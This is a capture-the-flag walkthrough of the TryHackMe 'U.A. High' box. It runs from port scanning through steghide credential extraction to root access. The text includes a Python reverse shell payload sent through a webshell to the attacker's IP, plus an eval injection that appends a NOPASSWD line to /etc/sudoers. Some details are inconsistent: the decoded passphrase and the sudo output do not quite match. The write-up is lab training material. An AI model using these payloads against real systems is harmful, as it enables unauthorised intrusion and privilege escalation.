ğŸ’¥ TryHackMe â€” U.A. High (Easy)

    Walkthrough by Digvijay Netke (netke)

ğŸ§  Context

A brand new TryHackMe box dropped named "U.A. High". As an anime fan and aspiring hacker, I had to jump on it. Here's how I went from 0 to root, using webshells, steghide, and a vulnerable bash script.
ğŸ” Initial Enumeration
âœ… Nmap Scan

nmap -sC -sV -Pn -T4 -p- -oA uahigh 10.10.34.14

ğŸŸ¢ Ports Open:

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache/2.4.41 (Ubuntu)

ğŸŒ Web Recon

Navigated to:

http://10.10.34.14

Saw a basic U.A. High web page.
ğŸ” Fuzzed for Directories:

ffuf -u http://10.10.34.14/assets/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

Found:

    /assets/

    /assets/index.php

âš™ï¸ Remote Code Execution

Visited:

http://10.10.34.14/assets/index.php

Blank page. Looked suspicious.
ğŸ§ª Tested for Web Shell:

http://10.10.34.14/assets/index.php?cmd=whoami

Boom ğŸ’¥ â€” command injection confirmed.
Output was base64 encoded â†’ typical webshell behavior.

Decoded base64 â†’ got:

www-data

ğŸª Reverse Shell
ğŸ›  Payload used:

http://10.10.34.14/assets/index.php?cmd=python3+-c+"import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.17.63.152',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'])"

ğŸ“ Listener setup:

nc -nvlp 1234

Connected as:

www-data@ip-10-10-34-14

Shell obtained âœ…
ğŸ“‚ Looting for Credentials

Enumerated /home, /opt, /var/www/html/assets, etc.
ğŸ–¼ Found:

oneforall.jpg

File looked broken â€” couldnâ€™t open it properly.
ğŸ§ª File Analysis & Steg
ğŸ” Checked type:

file oneforall.jpg

â†’ data
âš ï¸ Corrupted image â€” fixed using hexedit / MagicBytes tool:

https://github.com/Haxrein/MagicBytes

Image became viewable â€” anime-themed image (cool but sus...)
ğŸ” Steghide

Tried:

steghide extract -sf oneforall.jpg

Prompted for passphrase.
ğŸ’¡ Found base64-encoded passphrase in Hidden_Content:

QWxsbWlnaHRmb3JFdmVyISE=

Decoded:

AllmightforEver!!!

âœ… Extracted hidden content:

steghide extract -sf oneforall.jpg -p "AllmightforEver!!!"

Revealed:

username: deku
password: [REDACTED]

ğŸ”‘ SSH as Deku

ssh deku@10.10.34.14

Got user shell âœ…

cat user.txt

ğŸ”¼ Privilege Escalation â€” Deku's Rise
ğŸ” Check Groups:

id

Found:

deku belongs to sudo

ğŸ” Check Sudo Permissions:

sudo -l

Output:

(ALL) /opt/NewComponent/feedback.sh
(root) NOPASSWD: ALL

    âš ï¸ I could run feedback.sh as root!

ğŸ’£ Vulnerable Script - feedback.sh

#!/bin/bash
read feedback
eval "echo $feedback"

Even with filters, it uses eval â†’ easy RCE!
ğŸ›  Exploit: Rewrite Sudoers

Ran:

sudo /opt/NewComponent/feedback.sh

Input:

deku ALL=NOPASSWD:ALL >> /etc/sudoers

Now deku has full sudo with no password.
ğŸ§¨ Escalated to Root:

sudo su -

ğŸ Final Flag:

cat /root/root.txt

ROOTED âœ…
ğŸ§  Summary
Step	Action
ğŸ”	Enumerated open ports & found hidden web shell
ğŸš	Gained RCE via /assets/index.php?cmd=
ğŸ“	Sent reverse shell payload, got www-data
ğŸ–¼	Found broken JPG â†’ extracted with steghide
ğŸ”	Used base64-encoded password: AllmightforEver!!!
ğŸ”‘	Got SSH creds for deku
ğŸ”¼	Used sudo-allowed feedback.sh with eval
ğŸ§¨	Injected to write to /etc/sudoers
ğŸ‘‘	Gained full root access via sudo su
